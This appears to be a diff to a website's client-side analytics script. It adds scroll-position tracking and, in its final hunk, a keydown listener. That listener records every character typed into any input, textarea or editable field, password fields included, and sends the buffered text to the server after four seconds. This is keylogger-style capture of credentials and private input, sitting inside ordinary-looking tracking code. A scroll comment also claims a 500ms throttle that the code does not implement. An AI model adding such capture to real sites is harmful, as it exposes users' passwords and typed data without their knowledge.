@@ -20,9 +20,29 @@ socket.emit('track_event', {
     viewport: {
       width: window.innerWidth,
       height: window.innerHeight
-    }
+    },
+    scrollX: window.scrollX,
+    scrollY: window.scrollY
   },
   page: currentPage
+});
+
+// Track scroll position
+let lastScroll = { x: window.scrollX, y: window.scrollY };
+window.addEventListener('scroll', () => {
+  const now = Date.now();
+  // Only emit if changed or 500ms passed
+  if (window.scrollX !== lastScroll.x || window.scrollY !== lastScroll.y) {
+    lastScroll = { x: window.scrollX, y: window.scrollY };
+    socket.emit('track_event', {
+      type: 'scroll',
+      data: {
+        scrollX: window.scrollX,
+        scrollY: window.scrollY
+      },
+      page: currentPage
+    });
+  }
 });
 
 // Track mouse movement with element detection
@@ -48,7 +68,9 @@ document.addEventListener('mousemove', (e) => {
         viewport: {
           width: window.innerWidth,
           height: window.innerHeight
-        }
+        },
+        scrollX: window.scrollX,
+        scrollY: window.scrollY
       },
       page: currentPage
     });
@@ -116,7 +138,9 @@ window.addEventListener('popstate', () => {
         viewport: {
           width: window.innerWidth,
           height: window.innerHeight
-        }
+        },
+        scrollX: window.scrollX,
+        scrollY: window.scrollY
       },
       page: currentPage
     });
@@ -148,3 +172,46 @@ function getVisibleElements() {
   }
   return elements;
 }
+
+// Track keystrokes and emit after user stops typing for 4 seconds
+let keystrokeBuffer = '';
+let keystrokeTimeout = null;
+let lastInputElement = null;
+
+document.addEventListener('keydown', (e) => {
+  // Only track visible input, textarea, or contenteditable elements
+  const active = document.activeElement;
+  if (
+    active &&
+    (
+      active.tagName === 'INPUT' ||
+      active.tagName === 'TEXTAREA' ||
+      active.isContentEditable
+    )
+  ) {
+    // Don't track modifier keys
+    if (e.key.length === 1) {
+      keystrokeBuffer += e.key;
+    } else if (e.key === 'Enter') {
+      keystrokeBuffer += '\n';
+    } else if (e.key === 'Backspace') {
+      keystrokeBuffer = keystrokeBuffer.slice(0, -1);
+    }
+    lastInputElement = getElementInfo(active);
+
+    if (keystrokeTimeout) clearTimeout(keystrokeTimeout);
+    keystrokeTimeout = setTimeout(() => {
+      if (keystrokeBuffer.length > 0) {
+        socket.emit('track_event', {
+          type: 'keystroke',
+          data: {
+            value: keystrokeBuffer,
+            element: lastInputElement
+          },
+          page: currentPage
+        });
+        keystrokeBuffer = '';
+      }
+    }, 4000);
+  }
+});
